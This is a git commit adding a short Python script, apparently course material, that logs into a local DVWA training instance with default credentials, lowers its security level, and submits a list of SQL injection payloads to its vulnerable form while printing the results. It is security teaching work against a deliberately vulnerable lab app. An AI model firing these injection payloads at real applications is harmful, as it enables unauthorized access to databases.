2fcb2c5ec422b1d96007b7261920886b679a2b3e
dpalbd <dpalbd@gmail.com>
2020-05-25 23:12:57 +0600

    Create dwva-simple-sql-test2.py

---
+++ Module -4/dwva-simple-sql-test2.py
@@ -0,0 +1,36 @@
+#!/usr/bin/env python
+
+
+import mechanize
+import re
+import sys
+from bs4 import BeautifulSoup
+
+br = mechanize.Browser()
+response1 = br.open('http://192.168.30.143/dvwa/login.php')
+br.select_form(nr=0)
+br.set_value("admin", name="username", nr=0)
+br.set_value("password", name="password", nr=0)
+br.submit()
+print "DVWA Login successful"
+
+response2=br.open('http://192.168.30.143/dvwa/security.php')
+br.select_form(nr=0)
+br.set_value(['low'], name='security', nr=0)
+br.submit()
+print "DVWA Security level set to low"
+
+
+print "DVWA SQL Injection Checking...."
+response3=br.open('http://192.168.30.143/dvwa/vulnerabilities/sqli/')
+
+sqlipayloadlist= ['1 and 1=1','1 or 1=1', "1' or '1'='1", '1or1=1', "1'or'1'='1", "fake@ema'or'il.nl'='il.nl"]
+
+for sqli in sqlipayloadlist:
+        print sqli
+        br.select_form(nr=0)
+        br.set_value(sqli, name="id", nr=0)
+        br.submit()
+        soup = BeautifulSoup(br.response().read(),'lxml')
+        pre_content=soup.find_all('pre')
+        print pre_content
